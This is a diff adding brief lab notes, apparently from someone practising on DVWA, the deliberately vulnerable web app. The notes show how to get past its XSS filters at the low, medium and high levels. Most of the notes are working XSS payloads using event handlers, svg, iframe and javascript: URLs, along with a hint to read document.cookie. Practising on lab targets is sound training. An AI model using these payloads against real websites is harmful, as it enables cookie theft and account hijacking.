@@ -1,0 +1,43 @@
+HOW CAN YOU HACK DVWA USING XSS? :
+
+================LOW LEVEL================
+All xss scripts work at this lvl because the web-site has no validation or filter 
+Example XSS-payloads: 
+1. <script>alert('XSS')</script>
+2. <img src=x onerror=alert('XSS')>
+3. <div onmouseover="alert('XSS')">Hover me</div> !(works when you hover your mouse over it)!
+=========================================
+
+==============MEDIUM LEVEL===============
+At this lvl the web-site has a replace string: <script> to ''
+FILTER CODE FROM DVWA SOURCE:
+ $name = str_replace( '<script>', '', $_GET[ 'name' ] ); 
+!!So bad code because we can replace <script> with <ScrIpT> and it will work!!
+
+XSS-payloads with tag <script> will not work!
+NON-working exaples:
+1. <script>alert('XSS')</script>
+2. <svg><script>alert('XSS')</script>
+
+Example of Working XSS-payloads:
+1. <img src=x onerror=alert('XSS')>
+2. <svg onload=alert('XSS')>
+3. <iframe src="javascript:alert('XSS')"></iframe>
+4. <input value="" onfocus="alert('XSS')">
+5. <div onmouseover="alert('XSS')">Hover me</div>
+
+=========================================
+
+================HIGH LEVEL===============
+Here we have filter code like: $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
+Bad code - Protects only against payloads with <script>
+ 
+XSS-payloads:
+note: you can replace -> alert("XSS") with -> alert(document.cookie) and show it!
+1. <img src=1 onerror='alert("XSS")'>
+2. <input value="" onfocus="alert('XSS')">
+3. <body onload=alert('XSS')>
+
+=========================================
+
+so easy for us..
